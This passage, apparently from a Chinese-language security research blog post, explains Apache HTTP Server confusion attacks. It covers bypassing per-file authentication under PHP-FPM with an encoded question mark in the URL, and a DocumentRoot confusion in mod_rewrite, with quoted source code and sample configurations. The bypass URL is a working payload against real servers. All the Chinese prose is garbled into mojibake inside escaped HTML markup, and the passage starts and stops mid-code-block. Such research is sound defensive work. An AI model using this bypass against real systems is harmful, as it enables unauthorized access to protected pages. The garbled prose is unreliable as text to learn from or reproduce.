    &lt;span class=&quot;nc&quot;&gt;AuthUserFile&lt;/span&gt; &quot;/etc/apache2/.htpasswd&quot;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; valid-user
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨é è¨­å®‰è£çš„ PHP-FPM ç’°å¢ƒä¸­ï¼Œé€™ç¨®è¨­å®šå¯ä»¥è¢«ç›´æ¥ç¹éï¼ é †é“ä¸€æé€™ä¹Ÿæ˜¯ Apache HTTP Server ä¸­æœ€å¸¸è¦‹åˆ°çš„èªè­‰æ–¹å¼ï¼ å‡è¨­ä»Šå¤©ä½ ç€è¦½äº†é€™æ¨£çš„ç¶²å€ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/admin.php%3Fooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;é¦–å…ˆåœ¨é€™å€‹ç¶²å€çš„ HTTP ç”Ÿå‘½é€±æœŸä¸­ï¼Œèªè­‰æ¨¡çµ„æœƒå°‡è«‹æ±‚çš„æª”æ¡ˆåç¨±èˆ‡è¢«ä¿è­·çš„æª”æ¡ˆé€²è¡Œæ¯”å°ï¼Œæ­¤æ™‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; æ¬„ä½æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php?ooo.php&lt;/code&gt; ç†æ‰€ç•¶ç„¶èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt; ä¸ç¬¦åˆï¼Œæ–¼æ˜¯æ¨¡çµ„æœƒèªç‚ºç•¶å‰è«‹æ±‚ä¸éœ€è¦èªè­‰ã€‚ ç„¶è€Œ PHP-FPM çš„è¨­å®šæª”æ¡ˆåˆè¨­å®šç•¶æ”¶åˆ°çµå°¾ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; çš„è«‹æ±‚æ™‚é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetHandler&lt;/code&gt; èªæ³•å°‡è«‹æ±‚è½‰äº¤çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /etc/apache2/mods-enabled/php8.2-fpm.conf&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Using (?:pattern) instead of (pattern) is a small optimization that&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# avoid capturing the matching pattern (as $1) which isn&apos;t used here&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;.+\.ph(?:ar|p|tml)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; &quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; æœƒå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; é‡å¯«æˆä»¥ä¸‹ç¶²å€ä¸¦æ ¹æ“šå…¶ä¸­çš„å”è­°å‘¼å«å­æ¨¡çµ„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_fcgi&lt;/code&gt; è™•ç†å¾ŒçºŒ FastCGI å”è­°çš„é‚è¼¯ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç”±æ–¼é€™æ™‚å¾Œç«¯åœ¨æ”¶åˆ°æª”æ¡ˆåç¨±æ™‚å·²ç¶“æ˜¯ä¸€å€‹å¥‡æ€ªçš„æ ¼å¼äº†ï¼ŒPHP-FPM åªå¥½å°é€™å€‹è¡Œç‚ºåšç‰¹åˆ¥è™•ç†ï¼Œå…¶ä¸­è™•ç†çš„é‚è¼¯å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044&quot;&gt;sapi/fpm/fpm/fpm_main.c#L1044&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define APACHE_PROXY_FCGI_PREFIX &quot;proxy:fcgi://&quot;
#define APACHE_PROXY_BALANCER_PREFIX &quot;proxy:balancer://&quot;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strncasecmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* advance to first character of hostname */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* move past hostname and port */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apache_was_here&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ignore query string if sent by Apache (RewriteRule) */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ° PHP-FPM å…ˆå°æª”æ¡ˆåç¨±æ­£è¦åŒ–ä¸¦å°å…¶ä¸­çš„å•è™Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; é€²è¡Œåˆ†éš”å–å‡ºå…¶ä¸­å¯¦éš›çš„æª”æ¡ˆè·¯å¾‘ä¸¦åŸ·è¡Œ (ä¹Ÿå°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/admin.php&lt;/code&gt;)ã€‚ æ‰€ä»¥åŸºæœ¬ä¸Š&lt;strong&gt;æ‰€æœ‰ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; èªæ³•é‡å°å–®ä¸€ PHP æª”æ¡ˆçš„èªè­‰æˆ–æ˜¯å­˜å–æ§åˆ¶è¨­å®šåœ¨é‹è¡Œ PHP-FPM çš„æƒ…å¢ƒä¸‹éƒ½å­˜åœ¨é¢¨éšªï¼&lt;/strong&gt; ğŸ˜®&lt;/p&gt;

&lt;p&gt;å¾ GitHub ä¸Šå¯ä»¥æ‰¾åˆ°éå¸¸å¤šæ½›åœ¨æœ‰é¢¨éšªçš„è¨­å®šï¼Œä¾‹å¦‚è¢«é™åˆ¶åœ¨åªæœ‰å…§ç¶²æ‰èƒ½å­˜å–çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# protect phpinfo, only allow localhost and local network access&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; php-info.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# LOCAL ACCESS ONLY&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Require local &lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# LOCAL AND LAN ACCESS&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; ip 10 172 192.168
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; é˜»æ“‹èµ·ä¾†çš„ Adminerï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; adminer.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¢«ä¿è­·èµ·ä¾†çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmlrpc.php&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; xmlrpc.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é˜²æ­¢ç›´æ¥å­˜å–çš„å‘½ä»¤è¡Œå·¥å…·ï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;cron.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€éèªè­‰æ¨¡çµ„ä»¥åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; é–“å° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; æ¬„ä½ç†è§£çš„ä¸ä¸€è‡´ï¼Œä¸Šé¢æ‰€æœ‰çš„ä¾‹å­éƒ½å¯ä»¥é€éä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; æˆåŠŸç¹éï¼&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-2-documentroot-confusion&quot;&gt;ğŸ”¥ 2. DocumentRoot Confusion&lt;/h3&gt;

&lt;p&gt;æ¥ä¸‹ä¾†è¦ä»‹ç´¹çš„æ”»æ“Šæ˜¯åŸºæ–¼ DocumentRoot ä¸Šçš„ Confusion Attackï¼ é¦–å…ˆä½ å¯ä»¥æ€è€ƒä¸€ä¸‹ï¼Œå°æ–¼ä¸‹é¢é€™æ¨£å­çš„ Httpd è¨­å®šï¼š&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^/html/(.*)$   /$1.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•¶ç€è¦½ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/html/about&lt;/code&gt; æ™‚ï¼Œåˆ°åº•å¯¦éš› Httpd æœƒé–‹å•Ÿå“ªå€‹æª”æ¡ˆï¼Ÿ æ˜¯æ ¹ç›®éŒ„ä¸‹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/about.html&lt;/code&gt; é‚„æ˜¯ DocumentRoot ä¸‹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/about.html&lt;/code&gt; å‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç­”æ¡ˆæ˜¯ â€”â€” &lt;strong&gt;å…©å€‹è·¯å¾‘éƒ½æœƒå­˜å–&lt;/strong&gt;ã€‚ é€™ä¹Ÿæ˜¯æˆ‘å€‘çš„ç¬¬äºŒå€‹ Confusion Attackï¼Œ&lt;strong&gt;å°æ–¼ä»»æ„&lt;sup&gt;[1]&lt;/sup&gt;çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;ï¼ŒHttpd ç¸½æ˜¯æœƒå˜—è©¦é–‹å•Ÿå¸¶æœ‰ DocumentRoot çš„è·¯å¾‘ä»¥åŠæ²’æœ‰çš„è·¯å¾‘ï¼&lt;/strong&gt; æœ‰è¶£å§ ğŸ˜‰&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] ä½æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; æˆ– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost Block&lt;/code&gt; å…§&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939&quot;&gt;modules/mappers/mod_rewrite.c#L4939&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPTION_LEGACY_PREFIX_DOCROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mod_rewrite_uri_reduced&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix_stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1] access without root&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_core_translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2] access with root&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixing with document_root of %s&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;&quot; FAILED&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

